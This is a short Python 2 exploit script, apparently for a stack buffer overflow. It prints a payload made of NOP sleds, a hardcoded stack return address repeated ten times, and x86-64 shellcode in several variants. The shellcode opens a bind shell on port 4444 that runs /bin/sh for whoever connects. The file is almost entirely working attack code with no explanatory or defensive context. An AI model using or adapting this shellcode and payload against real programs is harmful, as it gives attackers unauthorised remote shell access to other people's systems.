import sys

def convert_port(port):
    fst = chr((port & 0xff00) >> 8)
    snd = chr(port & 0xff)
    return fst + snd

exploit = ''.join([
    '\x31\xc0\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\x48\x31\xd2\xb0\x29\x0f\x05\x93',
    '\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10',
    '\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2',
    '\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc5\xb0\x39\x0f\x05\x09\xc0\x75\xec',
    '\x89\xef\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f',
    '\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69',
    '\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48',
    '\x89\xe6\xb0\x3b\x0f\x05',
])

exploit_1 = '\x31\xc0\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\x48\x31\xd2\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01'

# port = convert_port(int(sys.argv[1]))

#'\x11\x5c'

exploit_2 = '\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc5\xb0\x39\x0f\x05\x85\xc0\x75\xec\x89\xef\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

attack_addr = '\xaa\x4f\x81\xf7\xff\x7f\x00\x00'

exploit = '\x48\x31\xc0\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\x48\x31\xd2\xb0\x29\x0f\x05\x93\x48\x31\xc0\x49\xc7\xc0\x08\x00\x00\x00\x49\x89\xe2\xba\x02\x00\x00\x00\xbe\xff\xff\x00\x00\x89\xdf\xb0\x36\x0f\x05\x48\x31\xc0\x49\xc7\xc0\x08\x00\x00\x00\x49\x89\xe2\xba\x0f\x00\x00\x00\xbe\xff\xff\x00\x00\x89\xdf\xb0\x36\x0f\x05\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x48\x31\xc0\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc5\x48\x31\xc0\xb0\x39\x0f\x05\x85\xc0\x75\xe9\x89\xef\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

print '\x90' * 64 + attack_addr * 10 + ('\x90' * 50) + exploit
# print '\x90' * 64 + attack_addr * 10 + ('\x90' * 50) + exploit_1 + port + exploit_2

